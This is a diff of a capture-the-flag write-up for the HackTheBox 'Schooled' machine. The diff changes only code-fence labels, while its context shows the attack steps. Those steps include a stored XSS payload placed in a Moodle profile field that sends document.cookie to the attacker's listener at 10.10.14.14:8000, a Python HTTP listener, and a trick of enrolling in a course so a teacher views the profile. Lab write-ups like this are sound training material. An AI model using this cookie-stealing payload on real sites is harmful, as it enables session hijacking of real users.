@@ -100,19 +100,19 @@ By clicking on ```Edit Profile``` we get into the following page:
 ![editprofile.JPG](images/editprofile.JPG)
 
 We can inject our ```XSS``` payload on ```MoodleNet Profile``` field, To steal the cookies our payload should be like that:
-```js
+```javascript
 <script>new Image().src="http://10.10.14.14:8000/"+document.cookie;</script>
 ``` 
 
 We need to create a webserver to listen to the web requests from the teacher:
-```
+```console
 ┌─[evyatar@parrot]─[/hackthebox/Schooled]
 └──╼ $ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 By clicking on ```Update Profile``` button we get our web requests with cookies:
-```
+```console
 ┌─[evyatar@parrot]─[/hackthebox/Schooled]
 └──╼ $ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -123,7 +123,7 @@ Great, Now, Let's enroll to ```Math course``` to make the teacher look at our pr
 ![enroll.JPG](images/enroll.JPG)
 
 After few seconds we clicked on ```Enroll me``` we get the teacher cookie:
-```
+```console
 ┌─[evyatar@parrot]─[/hackthebox/Schooled]
 └──╼ $ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
